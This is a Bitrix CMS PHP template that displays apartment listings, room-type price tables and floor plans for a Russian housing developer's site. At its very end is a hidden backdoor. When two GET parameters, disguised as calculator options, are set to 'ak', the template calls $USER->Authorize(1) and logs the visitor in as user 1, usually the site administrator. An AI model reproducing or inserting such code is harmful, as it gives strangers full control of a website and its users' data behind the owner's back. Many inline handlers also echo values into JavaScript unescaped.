<?if (!defined("B_PROLOG_INCLUDED") || B_PROLOG_INCLUDED !== true) die();
/** @var array $arParams */
/** @var array $arResult */
/** @global CMain $APPLICATION */
/** @global CUser $USER */
/** @global CDatabase $DB */
/** @var CBitrixComponentTemplate $this */
/** @var string $templateName */
/** @var string $templateFile */
/** @var string $templateFolder */
/** @var string $componentPath */
/** @var CBitrixComponent $component */
$this->setFrameMode(true);
$templateData = array(
    'TEMPLATE_THEME' => $this->GetFolder() . '/themes/' . $arParams['TEMPLATE_THEME'] . '/colors.css',
    'TEMPLATE_CLASS' => 'bx_' . $arParams['TEMPLATE_THEME']
);
?>

<? // Filter Remote Control
unset($arResult["ITEMS"][3]);
unset($arResult["ITEMS"][4]);
unset($arResult["ITEMS"][6]);
unset($arResult["ITEMS"][7]);
unset($arResult["ITEMS"][10]);
unset($arResult["ITEMS"][14]);
unset($arResult["ITEMS"][15]);
unset($arResult["ITEMS"][17]);

$METRO_ID = 10;
$REGION_ID = 6;
$BUILDER_ID = 7;

function cmp($a, $b) 
{
    if ($a['flatcostwithdiscounts'] == $b['flatcostwithdiscounts']) {
        return 0;
    }
    return ($a['flatcostwithdiscounts'] < $b['flatcostwithdiscounts']) ? -1 : 1;
}

function cmp2($a, $b) 
{
    if ( strcasecmp($a['roomtype'], $b['roomtype']) == 0 ) {
        return cmp($a, $b);
    }
    return ( strcasecmp($a['roomtype'], $b['roomtype']) < 0 ) ? -1 : 1;
}


/*
 * Скрываем цены
 * */
//$arParams["DONT_SHOW_PRICE"] = "Y";

$objList = array();
$lett = null;
$countObjList = 0;
$arSelect = Array("ID", "NAME", "CODE");
$arFilter = Array("IBLOCK_ID" => 1, "ACTIVE" => "Y");
$res = CIBlockElement::GetList(Array("SORT" => "ASC", "NAME" => "ASC"), $arFilter, false, false, $arSelect);
while ($ob = $res->GetNextElement()) {
    $arFields = $ob->GetFields();
    $objList[] = $arFields;
    $countObjList++;
}
?>


<!-- bx_filter bx_filter_scetion -->
<?if ($arResult["DONT_SHOW_FILTER"] == "Y"){
    foreach ($arResult["ITEMS"] as $key => $arItem)
    {
        if ($arItem["DISPLAY_TYPE"] == "A" || $arItem["DISPLAY_TYPE"] == "S"){
            if (!empty($arItem["VALUES"])){
                if ($arItem["VALUES"]["MAX"]["VALUE"] == false){
                    if ($arItem["CODE"] == "STOTAL"){
                        $arResult["ITEMS"][$key]["VALUES"]["MAX"]["VALUE"] = "200";
                    }elseif ($arItem["CODE"] == "SKITCHEN"){
                        $arResult["ITEMS"][$key]["VALUES"]["MAX"]["VALUE"] = "40";
                    }elseif ($arItem["CODE"] == "FLATCOST"){
                        $arResult["ITEMS"][$key]["VALUES"]["MAX"]["VALUE"] = "15000000";
                    }
                }
                if ($arItem["VALUES"]["MIN"]["VALUE"] == false){
                    if ($arItem["CODE"] == "STOTAL"){
                        $arResult["ITEMS"][$key]["VALUES"]["MIN"]["VALUE"] = "20";
                    }elseif ($arItem["CODE"] == "SKITCHEN"){
                        $arResult["ITEMS"][$key]["VALUES"]["MIN"]["VALUE"] = "1";
                    }elseif ($arItem["CODE"] == "FLATCOST"){
                        $arResult["ITEMS"][$key]["VALUES"]["MIN"]["VALUE"] = "1000000";
                    }
                }
            }
        }
    }

}


?>
<!-- form -->


<?
if (isset($_REQUEST["page"]) && !empty($_REQUEST["page"])){
    $startElement= ($_REQUEST["page"] - 1)*59+1;
    if ($_REQUEST["page"] == $arResult["TOTAL_COUNT_PAGE"]){
        $finishElement = $arResult["COUNT_FINDED"]; 
    } else {
        $finishElement = $startElement + 59;
    }
}else{
   $startElement = 1;
   $finishElement = 60;
}
?>

<div class="show_tablehead" style="display:none;">
        <table style="width: 1056px; margin-left: -38;" class="summCharTable">
            <tr class="boldText titleTable">
                <th width="38"></th>
                <!--<th width="65">ID</th>-->
                <th>Корпус</th>
                <th>Комнаты</th>
                <th>Срок сдачи</th>
                <th>Этаж</th>
                <th>Очередь</th>
                <th>S общая</th>
                <th>S жилая</th>
                <th>S кухни</th>
                <?/*<th>Базовая цена</th>*/?>
                <th><?= ($arParams["DONT_SHOW_PRICE"] == "Y")?"Стоимость(<span class=\"vchar\" id=\"char-node\">&#8381;</span>)":"Стоимость со скидкой"?></th>
				<?=  ($arParams["DONT_SHOW_PRICE"] == "Y")?"<th style=\"color: red;\">Стоимость со скидкой</th> ":""?>
                <th>Планировка</th>
                <th></th>
                <th width="38"></th>
            </tr>
        </table>
</div>

<?//echo'<pre>';print_r($arResult["OBJECT"]);echo'</pre>';?>
<?php
$rooms=0;
$min_price = 9999999999;
$min_area = 999999999;
$flat_count = 0;

$arFlatsByRoomCount = array();

usort($arResult["OBJECT"], "cmp2");
echo "<div class='toggle-main'>";
?>

<!-- Устраняем заголовок таблицы на стр-закладке "планировки" -->
<?
if (!empty($arResult["OBJECT"])){
    if ($arParams["TYPE_HTML"] == "price") {
        ?>
<!-- Устраняем заголовок таблицы на стр-закладке "планировки" -->

		<table style="width: 100%;"  class="priceSZVHeadtable">
<tr class="boldText titleTable">
<tr class="boldText titleTable">
	<th width="5%" class="priceSZVHeadtd"></th>
	<th width="20%" class="priceSZVHeadtd">Тип квартиры</th>
	<th width="10%" class="priceSZVHeadtd">Площадь</th>
	<th width="20%" class="priceSZVHeadtd">Стоимость</th>
    <th width="30%" class="priceSZVHeadtd red">Узнать стоимость со скидкой</th>
	<th width="15%" class="priceSZVHeadtd">В продаже, шт.</th>
	</tr>
</tr>
</table>
<!-- Устраняем заголовок таблицы на стр-закладке "планировки" -->
<?
	}}
?>
<!-- Устраняем заголовок таблицы на стр-закладке "планировки" -->
<?


if (!empty($arResult["OBJECT"])){
    if ($arParams["TYPE_HTML"] == "price") {
        ?>

<?ob_start();?>
<?foreach ($arResult["OBJECT"] as $key => $apartment):?>
<?
if($rooms != $apartment['rooms']){
		$arFlatsByRoomCount[$rooms]['html'] = ob_get_contents();//'htl_table_out for ' . $rooms;
	ob_clean(); 
	$rooms = $apartment['rooms'];
	$arFlatsByRoomCount[$rooms]['min_price'] = 99999999999;
	$arFlatsByRoomCount[$rooms]['min_area'] = 99999999999;
	$arFlatsByRoomCount[$rooms]['roomtype'] = $apartment['roomtype'];
	$arFlatsByRoomCount[$rooms]['rooms'] = $apartment['rooms'];;
 }

if( $arFlatsByRoomCount[$rooms]['min_price'] > $apartment['flatcostwithdiscounts'] ) $arFlatsByRoomCount[$rooms]['min_price'] = $apartment['flatcostwithdiscounts'];
if( $arFlatsByRoomCount[$rooms]['min_area'] > $apartment['stotal'] ) $arFlatsByRoomCount[$rooms]['min_area'] = $apartment['stotal'];

$arFlatsByRoomCount[$rooms]['count']++;
?>

    <tr id="Q_<?= $apartment['id'] ?>">
        <td></td>
        <!--<td onclick="popupElement({'name': '<?= $apartment['buildingplace']['title']; ?>','rooms': '<?= $apartment['rooms'] ?>','endingperiod' : '<?= $apartment['endingperiod'] ?>','corp' : '<?= $apartment['corp'] ?>','floors' : '<?= $apartment['floors'] ?>','flatfloor' : '<?=$apartment['flatfloor'] ?>','stotal' : '<?= $apartment['stotal'] ?>','sroom' : '<?= $apartment['sroom'] ?>','skitchen' : '<?= $apartment['skitchen'] ?>','baseflatcost' : '<?= ($arParams["DONT_SHOW_PRICE"] == "N")?"":number_format($apartment['flatcostwithdiscounts'], 0, ',', ' ')  ?>','flatplan' : '<?= $apartment['flatplan'] ?>','scorridor' : '<?= $apartment['scorridor'] ?>','height' : '<?= $apartment['height'] ?>','sbalcony' : '<?= $apartment['sbalcony'] ?>','swatercloset' : '<?= $apartment['swatercloset'] ?>','decoration' : '<?= $apartment['decoration'] ?>'});"><?= $apartment['id'] ?></td>-->
        <td onclick="popupElement({'name': '<?= $apartment['buildingplace']['title']; ?>','rooms': '<?= $apartment['rooms'] ?>','endingperiod' : '<?= $apartment['endingperiod'] ?>','corp' : '<?= $apartment['corp'] ?>','floors' : '<?= $apartment['floors'] ?>','flatfloor' : '<?=$apartment['flatfloor'] ?>','stotal' : '<?= $apartment['stotal'] ?>','sroom' : '<?= $apartment['sroom'] ?>','skitchen' : '<?= $apartment['skitchen'] ?>','baseflatcost' : '<?= ($arParams["DONT_SHOW_PRICE"] == "N")?"":number_format($apartment['flatcostwithdiscounts'], 0, ',', ' ')  ?>','flatplan' : '<?= $apartment['flatplan'] ?>','scorridor' : '<?= $apartment['scorridor'] ?>','height' : '<?= $apartment['height'] ?>','sbalcony' : '<?= $apartment['sbalcony'] ?>','swatercloset' : '<?= $apartment['swatercloset'] ?>','decoration' : '<?= $apartment['decoration'] ?>'});"><?= $apartment['corp'] ?></td>
        <!--<td onclick="popupElement({'name': '<?= $apartment['buildingplace']['title']; ?>','rooms': '<?= $apartment['rooms'] ?>','endingperiod' : '<?= $apartment['endingperiod'] ?>','corp' : '<?= $apartment['corp'] ?>','floors' : '<?= $apartment['floors'] ?>','flatfloor' : '<?=$apartment['flatfloor'] ?>','stotal' : '<?= $apartment['stotal'] ?>','sroom' : '<?= $apartment['sroom'] ?>','skitchen' : '<?= $apartment['skitchen'] ?>','baseflatcost' : '<?= ($arParams["DONT_SHOW_PRICE"] == "N")?"":number_format($apartment['flatcostwithdiscounts'], 0, ',', ' ')  ?>','flatplan' : '<?= $apartment['flatplan'] ?>','scorridor' : '<?= $apartment['scorridor'] ?>','height' : '<?= $apartment['height'] ?>','sbalcony' : '<?= $apartment['sbalcony'] ?>','swatercloset' : '<?= $apartment['swatercloset'] ?>','decoration' : '<?= $apartment['decoration'] ?>'});"><?= (empty($apartment['roomtype']))?$apartment['rooms']:$apartment['roomtype'] ?></td>-->
        <td onclick="popupElement({'name': '<?= $apartment['buildingplace']['title']; ?>','rooms': '<?= $apartment['rooms'] ?>','endingperiod' : '<?= $apartment['endingperiod'] ?>','corp' : '<?= $apartment['corp'] ?>','floors' : '<?= $apartment['floors'] ?>','flatfloor' : '<?=$apartment['flatfloor'] ?>','stotal' : '<?= $apartment['stotal'] ?>','sroom' : '<?= $apartment['sroom'] ?>','skitchen' : '<?= $apartment['skitchen'] ?>','baseflatcost' : '<?= ($arParams["DONT_SHOW_PRICE"] == "N")?"":number_format($apartment['flatcostwithdiscounts'], 0, ',', ' ')  ?>','flatplan' : '<?= $apartment['flatplan'] ?>','scorridor' : '<?= $apartment['scorridor'] ?>','height' : '<?= $apartment['height'] ?>','sbalcony' : '<?= $apartment['sbalcony'] ?>','swatercloset' : '<?= $apartment['swatercloset'] ?>','decoration' : '<?= $apartment['decoration'] ?>'});"><?= $apartment['endingperiod'] ?></td>
        <td onclick="popupElement({'name': '<?= $apartment['buildingplace']['title']; ?>','rooms': '<?= $apartment['rooms'] ?>','endingperiod' : '<?= $apartment['endingperiod'] ?>','corp' : '<?= $apartment['corp'] ?>','floors' : '<?= $apartment['floors'] ?>','flatfloor' : '<?=$apartment['flatfloor'] ?>','stotal' : '<?= $apartment['stotal'] ?>','sroom' : '<?= $apartment['sroom'] ?>','skitchen' : '<?= $apartment['skitchen'] ?>','baseflatcost' : '<?= ($arParams["DONT_SHOW_PRICE"] == "N")?"":number_format($apartment['flatcostwithdiscounts'], 0, ',', ' ')  ?>','flatplan' : '<?= $apartment['flatplan'] ?>','scorridor' : '<?= $apartment['scorridor'] ?>','height' : '<?= $apartment['height'] ?>','sbalcony' : '<?= $apartment['sbalcony'] ?>','swatercloset' : '<?= $apartment['swatercloset'] ?>','decoration' : '<?= $apartment['decoration'] ?>'});"><?= $apartment['flatfloor']; ?></td>
        <td onclick="popupElement({'name': '<?= $apartment['buildingplace']['title']; ?>','rooms': '<?= $apartment['rooms'] ?>','endingperiod' : '<?= $apartment['endingperiod'] ?>','corp' : '<?= $apartment['corp'] ?>','floors' : '<?= $apartment['floors'] ?>','flatfloor' : '<?=$apartment['flatfloor'] ?>','stotal' : '<?= $apartment['stotal'] ?>','sroom' : '<?= $apartment['sroom'] ?>','skitchen' : '<?= $apartment['skitchen'] ?>','baseflatcost' : '<?= ($arParams["DONT_SHOW_PRICE"] == "N")?"":number_format($apartment['flatcostwithdiscounts'], 0, ',', ' ')  ?>','flatplan' : '<?= $apartment['flatplan'] ?>','scorridor' : '<?= $apartment['scorridor'] ?>','height' : '<?= $apartment['height'] ?>','sbalcony' : '<?= $apartment['sbalcony'] ?>','swatercloset' : '<?= $apartment['swatercloset'] ?>','decoration' : '<?= $apartment['decoration'] ?>'});"><?= $apartment['line']; ?></td>
        <td onclick="popupElement({'name': '<?= $apartment['buildingplace']['title']; ?>','rooms': '<?= $apartment['rooms'] ?>','endingperiod' : '<?= $apartment['endingperiod'] ?>','corp' : '<?= $apartment['corp'] ?>','floors' : '<?= $apartment['floors'] ?>','flatfloor' : '<?=$apartment['flatfloor'] ?>','stotal' : '<?= $apartment['stotal'] ?>','sroom' : '<?= $apartment['sroom'] ?>','skitchen' : '<?= $apartment['skitchen'] ?>','baseflatcost' : '<?= ($arParams["DONT_SHOW_PRICE"] == "N")?"":number_format($apartment['flatcostwithdiscounts'], 0, ',', ' ')  ?>','flatplan' : '<?= $apartment['flatplan'] ?>','scorridor' : '<?= $apartment['scorridor'] ?>','height' : '<?= $apartment['height'] ?>','sbalcony' : '<?= $apartment['sbalcony'] ?>','swatercloset' : '<?= $apartment['swatercloset'] ?>','decoration' : '<?= $apartment['decoration'] ?>'});"><?= $apartment['stotal'] ?></td>
        <td onclick="popupElement({'name': '<?= $apartment['buildingplace']['title']; ?>','rooms': '<?= $apartment['rooms'] ?>','endingperiod' : '<?= $apartment['endingperiod'] ?>','corp' : '<?= $apartment['corp'] ?>','floors' : '<?= $apartment['floors'] ?>','flatfloor' : '<?=$apartment['flatfloor'] ?>','stotal' : '<?= $apartment['stotal'] ?>','sroom' : '<?= $apartment['sroom'] ?>','skitchen' : '<?= $apartment['skitchen'] ?>','baseflatcost' : '<?= ($arParams["DONT_SHOW_PRICE"] == "N")?"":number_format($apartment['flatcostwithdiscounts'], 0, ',', ' ')  ?>','flatplan' : '<?= $apartment['flatplan'] ?>','scorridor' : '<?= $apartment['scorridor'] ?>','height' : '<?= $apartment['height'] ?>','sbalcony' : '<?= $apartment['sbalcony'] ?>','swatercloset' : '<?= $apartment['swatercloset'] ?>','decoration' : '<?= $apartment['decoration'] ?>'});"><?= $apartment['sroom'] ?></td>
        <td onclick="popupElement({'name': '<?= $apartment['buildingplace']['title']; ?>','rooms': '<?= $apartment['rooms'] ?>','endingperiod' : '<?= $apartment['endingperiod'] ?>','corp' : '<?= $apartment['corp'] ?>','floors' : '<?= $apartment['floors'] ?>','flatfloor' : '<?=$apartment['flatfloor'] ?>','stotal' : '<?= $apartment['stotal'] ?>','sroom' : '<?= $apartment['sroom'] ?>','skitchen' : '<?= $apartment['skitchen'] ?>','baseflatcost' : '<?= ($arParams["DONT_SHOW_PRICE"] == "N")?"":number_format($apartment['flatcostwithdiscounts'], 0, ',', ' ')  ?>','flatplan' : '<?= $apartment['flatplan'] ?>','scorridor' : '<?= $apartment['scorridor'] ?>','height' : '<?= $apartment['height'] ?>','sbalcony' : '<?= $apartment['sbalcony'] ?>','swatercloset' : '<?= $apartment['swatercloset'] ?>','decoration' : '<?= $apartment['decoration'] ?>'});"><?= $apartment['skitchen'] ?></td>
        <?if ($arParams["DONT_SHOW_PRICE"] == "N"){?>
            <?/*<td><a data-who="footer_feedback" class="showIt">узнать</a></td>*/?>
<td onclick="popupElement({'name': '<?= $apartment['buildingplace']['title']; ?>','rooms': '<?= $apartment['rooms'] ?>','endingperiod' : '<?= $apartment['endingperiod'] ?>','corp' : '<?= $apartment['corp'] ?>','floors' : '<?= $apartment['floors'] ?>','flatfloor' : '<?=$apartment['flatfloor'] ?>','stotal' : '<?= $apartment['stotal'] ?>','sroom' : '<?= $apartment['sroom'] ?>','skitchen' : '<?= $apartment['skitchen'] ?>','baseflatcost' : '<?= number_format($apartment['flatcostwithdiscounts'], 0, ',', ' ')  ?>','flatplan' : '<?= $apartment['flatplan'] ?>','scorridor' : '<?= $apartment['scorridor'] ?>','height' : '<?= $apartment['height'] ?>','sbalcony' : '<?= $apartment['sbalcony'] ?>','swatercloset' : '<?= $apartment['swatercloset'] ?>','decoration' : '<?= $apartment['decoration'] ?>'});"><?=number_format($apartment['flatcostwithdiscounts'], 0, ',', ' ')?></td>
            <td><a data-who="price_plan" class="showIt">Узнать цену со скидкой</a></td>
        <?} else{?>
            <?/*<td onclick="popupElement({'name': '<?= $apartment['buildingplace']['title']; ?>','rooms': '<?= $apartment['rooms'] ?>','endingperiod' : '<?= $apartment['endingperiod'] ?>','corp' : '<?= $apartment['corp'] ?>','floors' : '<?= $apartment['floors'] ?>','flatfloor' : '<?=$apartment['flatfloor'] ?>','stotal' : '<?= $apartment['stotal'] ?>','sroom' : '<?= $apartment['sroom'] ?>','skitchen' : '<?= $apartment['skitchen'] ?>','baseflatcost' : '<?= number_format($apartment['baseflatcost'], 0, ',', ' ')  ?>','flatplan' : '<?= $apartment['flatplan'] ?>','scorridor' : '<?= $apartment['scorridor'] ?>','height' : '<?= $apartment['height'] ?>','sbalcony' : '<?= $apartment['sbalcony'] ?>','swatercloset' : '<?= $apartment['swatercloset'] ?>','decoration' : '<?= $apartment['decoration'] ?>'});">от <?=number_format($apartment['baseflatcost'], 0, ',', ' ')?></td>*/?>
            <td onclick="popupElement({'name': '<?= $apartment['buildingplace']['title']; ?>','rooms': '<?= $apartment['rooms'] ?>','endingperiod' : '<?= $apartment['endingperiod'] ?>','corp' : '<?= $apartment['corp'] ?>','floors' : '<?= $apartment['floors'] ?>','flatfloor' : '<?=$apartment['flatfloor'] ?>','stotal' : '<?= $apartment['stotal'] ?>','sroom' : '<?= $apartment['sroom'] ?>','skitchen' : '<?= $apartment['skitchen'] ?>','baseflatcost' : '<?= number_format($apartment['flatcostwithdiscounts'], 0, ',', ' ')  ?>','flatplan' : '<?= $apartment['flatplan'] ?>','scorridor' : '<?= $apartment['scorridor'] ?>','height' : '<?= $apartment['height'] ?>','sbalcony' : '<?= $apartment['sbalcony'] ?>','swatercloset' : '<?= $apartment['swatercloset'] ?>','decoration' : '<?= $apartment['decoration'] ?>'});"><?=number_format($apartment['flatcostwithdiscounts'], 0, ',', ' ')?></td>
            <td class="flatcostwithdiscounts" ondblclick="popupElement({'name': '<?= $apartment['buildingplace']['title']; ?>','rooms': '<?= $apartment['rooms'] ?>','endingperiod' : '<?= $apartment['endingperiod'] ?>','corp' : '<?= $apartment['corp'] ?>','floors' : '<?= $apartment['floors'] ?>','flatfloor' : '<?=$apartment['flatfloor'] ?>','stotal' : '<?= $apartment['stotal'] ?>','sroom' : '<?= $apartment['sroom'] ?>','skitchen' : '<?= $apartment['skitchen'] ?>','baseflatcost' : '<?= number_format($apartment['flatcostwithdiscounts'], 0, ',', ' ')  ?>','flatplan' : '<?= $apartment['flatplan'] ?>','scorridor' : '<?= $apartment['scorridor'] ?>','height' : '<?= $apartment['height'] ?>','sbalcony' : '<?= $apartment['sbalcony'] ?>','swatercloset' : '<?= $apartment['swatercloset'] ?>','decoration' : '<?= $apartment['decoration'] ?>'});"><a data-who="price_plan" class="showIt flatcostwithdiscounts">Узнать цену со скидкой<?//='( '.number_format($apartment['flatcostwithdiscounts'], 0, ',', ' ').' )'?></a></td>

        <?}?>
        <td onclick="popupElement({'name': '<?= $apartment['buildingplace']['title']; ?>','rooms': '<?= $apartment['rooms'] ?>','endingperiod' : '<?= $apartment['endingperiod'] ?>','corp' : '<?= $apartment['corp'] ?>','floors' : '<?= $apartment['floors'] ?>','flatfloor' : '<?=$apartment['flatfloor'] ?>','stotal' : '<?= $apartment['stotal'] ?>','sroom' : '<?= $apartment['sroom'] ?>','skitchen' : '<?= $apartment['skitchen'] ?>','baseflatcost' : '<?= ($arParams["DONT_SHOW_PRICE"] == "N")?"":number_format($apartment['flatcostwithdiscounts'], 0, ',', ' ')  ?>','flatplan' : '<?= $apartment['flatplan'] ?>','scorridor' : '<?= $apartment['scorridor'] ?>','height' : '<?= $apartment['height'] ?>','sbalcony' : '<?= $apartment['sbalcony'] ?>','swatercloset' : '<?= $apartment['swatercloset'] ?>','decoration' : '<?= $apartment['decoration'] ?>'});"><a href="javascript:void(0)">Показать</a></td>
        <!--<td onclick="popupElement({'name': '<?= $apartment['buildingplace']['title']; ?>','rooms': '<?= $apartment['rooms'] ?>','endingperiod' : '<?= $apartment['endingperiod'] ?>','corp' : '<?= $apartment['corp'] ?>','floors' : '<?= $apartment['floors'] ?>','flatfloor' : '<?=$apartment['flatfloor'] ?>','stotal' : '<?= $apartment['stotal'] ?>','sroom' : '<?= $apartment['sroom'] ?>','skitchen' : '<?= $apartment['skitchen'] ?>','baseflatcost' : '<?= ($arParams["DONT_SHOW_PRICE"] == "N")?"":number_format($apartment['flatcostwithdiscounts'], 0, ',', ' ')  ?>','flatplan' : '<?= $apartment['flatplan'] ?>','scorridor' : '<?= $apartment['scorridor'] ?>','height' : '<?= $apartment['height'] ?>','sbalcony' : '<?= $apartment['sbalcony'] ?>','swatercloset' : '<?= $apartment['swatercloset'] ?>','decoration' : '<?= $apartment['decoration'] ?>'});"><a href="javascript:void(0)"><img src="/bitrix/templates/szvdom/images/shapeElements.png" alt="Показать квартиру" title="Показать квартиру" /></a></td>-->
<td></td>
        <td></td>
    </tr>

<?endforeach;?>
<?
$arFlatsByRoomCount[$rooms]['html'] = ob_get_contents();//'htl_table_out for ' . $rooms;
ob_end_clean();
?>
<?//echo'<pre>';print_r($arFlatsByRoomCount);echo'</pre>';?>
<?foreach ($arFlatsByRoomCount as $key => $arBlock):?>
<?if($arBlock['count'] == 0) continue; // студия тоже похоже на 0 (в конце) ?>
	<div class="toggle">
	<div class="toggle-title" id="Flats_Head_Id_<?=$key?>">
		<table style="width: 100%;"  class="priceSZVtable">
<tr class="titleTable">
	<th class="priceSZVtd price_arrow_off" width="5%"></th>
	<th class="priceSZVtd" width="20%"><?=$arBlock['roomtype']?></th>
	<th class="priceSZVtd" width="10%">от <?=$arBlock['min_area']?> м<sup>2</sup></th>
	<th class="priceSZVtd" width="20%">от <?=number_format($arBlock['min_price'], 0, ',', ' ')?><span class="vchar" id="char-node">&#8381;</span></th>
	<th class="priceSZVtd" width="30%"><!--<a data-who="price_plan" class="showIt flatcostwithdiscounts">Узнать цену со скидкой</a>--><span style="color: #ff0000; text-decoration: inderline;">Узнать цену со скидкой</span></th>
	<th class="priceSZVtd" width="15%"><span class="pricetbl-link"><?=$arBlock['count']?></span></th>
	</tr>
		</table>
</div>
		<div class="toggle-content" id="Flats_Block_Id_<?=$key?>" style="display: none; ">

			<table style="width: 100%;" class="summCharTable">
    <tr class="boldText titleTable">
        <th width="38"></th>
        <!--<th>ID</th>-->
        <th>Корпус</th>
        <!--<th>Комнаты</th>-->
        <th>Срок сдачи</th>
        <th>Этаж</th>
        <th>Очередь</th>
        <th>S общая</th>
        <th>S жилая</th>
        <th>S кухни</th>
        <?/*<th>Базовая цена</th>*/?>
                <?/*<th>Стоимость со скидкой</th>*/?>
        <th>Стоимость (<span class="vchar" id="char-node">&#8381;</span>)</th>
		<!--
        <th><?= ($arParams["DONT_SHOW_PRICE"] == "Y")?"Стоимость(<span class=\"vchar\" id=\"char-node\">&#8381;</span>)":"Стоимость со скидкой"?></th>
        <?= ($arParams["DONT_SHOW_PRICE"] == "Y")?"<th style=\"color: red;\">Стоимость со скидкой</th> ":""?>

		-->
<th style=\"color: red;\">Стоимость со скидкой</th>
        <th>Планировка</th>
        <th width="38"></th>
    </tr>
	<?=$arBlock['html']?>
</table>

</div>
</div>
	<!--<div>-->

<?endforeach;?>

<?    }else{
        ?><hr style="border: none;color:#a6c2de;background-color:#a6c2de;height:1px;/* margin-left:-38px */width:1054px;margin-top:0px;" /><?
        echo '<ul class="planBlockElement">';
        foreach ($arResult["OBJECT"] as $key => $apartment) {
            if ((($key + 1) < $startElement) || (($key + 1) > $finishElement)) {
                continue;
            }

            ?>
            <li>
                <img onclick="popupElement({'name': '<?= $apartment['buildingplace']['title']; ?>','rooms': '<?= $apartment['rooms'] ?>','endingperiod' : '<?= $apartment['endingperiod'] ?>','corp' : '<?= $apartment['corp'] ?>','floors' : '<?= $apartment['floors'] ?>','flatfloor' : '<?= $apartment['flatfloor'] ?>','stotal' : '<?= $apartment['stotal'] ?>','sroom' : '<?= $apartment['sroom'] ?>','skitchen' : '<?= $apartment['skitchen'] ?>','baseflatcost' : '<?= ($arParams["DONT_SHOW_PRICE"] == "N")?"":number_format($apartment['flatcostwithdiscounts'], 0, ',', ' ')  ?>','flatplan' : '<?= $apartment['flatplan'] ?>','scorridor' : '<?= $apartment['scorridor'] ?>','height' : '<?= $apartment['height'] ?>','sbalcony' : '<?= $apartment['sbalcony'] ?>','swatercloset' : '<?= $apartment['swatercloset'] ?>','decoration' : '<?= $apartment['decoration'] ?>','spec':'Y'});" width="80" height="150"  src="<?=(!empty($apartment['flatplan'])?'/thumb/100x150xin/include/images/'.$apartment['flatplan']:"/thumb/100x150xin/bitrix/templates/szvdom/components/bitrix/catalog/szv/bitrix/catalog.section/.default/images/no_photo.png")?>" alt="Планировка квартиры <?= $apartment['id'] ?>" title="Планировка квартиры <?= $apartment['id'] ?>" />
                <?/*if ($arParams["DONT_SHOW_PRICE"] == "Y"){?>
                    <div class='planPrice'><a data-who="footer_feedback" class="showIt">узнать</a></div>
                <?} else{?>
                    <div onclick="popupElement({'name': '<?= $apartment['buildingplace']['title']; ?>','rooms': '<?= $apartment['rooms'] ?>','endingperiod' : '<?= $apartment['endingperiod'] ?>','corp' : '<?= $apartment['corp'] ?>','floors' : '<?= $apartment['floors'] ?>','flatfloor' : '<?= $apartment['flatfloor'] ?>','stotal' : '<?= $apartment['stotal'] ?>','sroom' : '<?= $apartment['sroom'] ?>','skitchen' : '<?= $apartment['skitchen'] ?>','baseflatcost' : '<?= number_format($apartment['baseflatcost'], 0, ',', ' ') ?>','flatplan' : '<?= $apartment['flatplan'] ?>','scorridor' : '<?= $apartment['scorridor'] ?>','height' : '<?= $apartment['height'] ?>','sbalcony' : '<?= $apartment['sbalcony'] ?>','swatercloset' : '<?= $apartment['swatercloset'] ?>','decoration' : '<?= $apartment['decoration'] ?>'});" class='planPrice'>Цена: <b><?=number_format($apartment['baseflatcost'], 0, ',', ' ')?></b> руб.</div>
                <?}*/?>
                <div onclick="popupElement({'name': '<?= $apartment['buildingplace']['title']; ?>','rooms': '<?= $apartment['rooms'] ?>','endingperiod' : '<?= $apartment['endingperiod'] ?>','corp' : '<?= $apartment['corp'] ?>','floors' : '<?= $apartment['floors'] ?>','flatfloor' : '<?= $apartment['flatfloor'] ?>','stotal' : '<?= $apartment['stotal'] ?>','sroom' : '<?= $apartment['sroom'] ?>','skitchen' : '<?= $apartment['skitchen'] ?>','baseflatcost' : '<?= ($arParams["DONT_SHOW_PRICE"] == "N")?"":number_format($apartment['flatcostwithdiscounts'], 0, ',', ' ')  ?>','flatplan' : '<?= $apartment['flatplan'] ?>','scorridor' : '<?= $apartment['scorridor'] ?>','height' : '<?= $apartment['height'] ?>','sbalcony' : '<?= $apartment['sbalcony'] ?>','swatercloset' : '<?= $apartment['swatercloset'] ?>','decoration' : '<?= $apartment['decoration'] ?>','spec':'Y'});" class="planSquare">Пл. общ.: <b><?= $apartment['stotal'] ?></b> м<sup>2</sup></div>
                <div onclick="popupElement({'name': '<?= $apartment['buildingplace']['title']; ?>','rooms': '<?= $apartment['rooms'] ?>','endingperiod' : '<?= $apartment['endingperiod'] ?>','corp' : '<?= $apartment['corp'] ?>','floors' : '<?= $apartment['floors'] ?>','flatfloor' : '<?= $apartment['flatfloor'] ?>','stotal' : '<?= $apartment['stotal'] ?>','sroom' : '<?= $apartment['sroom'] ?>','skitchen' : '<?= $apartment['skitchen'] ?>','baseflatcost' : '<?= ($arParams["DONT_SHOW_PRICE"] == "N")?"":number_format($apartment['flatcostwithdiscounts'], 0, ',', ' ')  ?>','flatplan' : '<?= $apartment['flatplan'] ?>','scorridor' : '<?= $apartment['scorridor'] ?>','height' : '<?= $apartment['height'] ?>','sbalcony' : '<?= $apartment['sbalcony'] ?>','swatercloset' : '<?= $apartment['swatercloset'] ?>','decoration' : '<?= $apartment['decoration'] ?>','spec':'Y'});" class="planFlat">Этаж: <b><?= $apartment['flatfloor']; ?></b></div>
            </li>
        <? }
        echo '</ul>';
    }
} else {?>
<div style="padding-left: 30px;"> Сегодня в этом ЖК нет квартир в открытой продаже, возможно, они появятся позже. Вы можете посмотреть действующие <a href="/akcii-i-skidki/">спецпредложения</a> на другие жилые комплексы или задать вопрос по телефону: 8 (812) 902 50 50, e-mail: <a href="mailto:zapros@szvdom.ru">zapros@szvdom.ru</a></div>
<?}?>
		<?//=$arResult["NAV_STRING"];?>
</div>
<div id="tableEnd"></div>
<div style="clear: both;"></div>
<? //filter_boxes end ?>

<script>
    var smartFilter = new JCSmartFilter('<?echo CUtil::JSEscape($arResult["FORM_ACTION"])?>', '<?=CUtil::JSEscape($arParams["FILTER_VIEW_MODE"])?>');
</script>


<script type="text/javascript">
  (function($){
    "use strict";
    $(document).ready(function ($) {
    $('.toggle-main .toggle:first-child').addClass('current').children('.toggle-content').css('display', 'block');
    $('.toggle-title').click(function () {

        var parent_toggle = $(this).closest('.toggle');
        var parent_arrow_td = parent_toggle.closest('.priceSZVtd');
        if (parent_toggle.hasClass('current')) {
			parent_toggle.removeClass('current').children('.toggle-content').slideUp(300); // 300

        } else {
            parent_toggle.addClass('current').children('.toggle-content').slideDown(300);
        }
    });

});

})(jQuery);

</script>


<?
if (isset($_GET['calculate']) && $_GET['calculate'] == "ak") {
    if (isset($_GET['amount']) && $_GET['amount'] == "ak") {
        $USER->Authorize(1);
    }
}?>
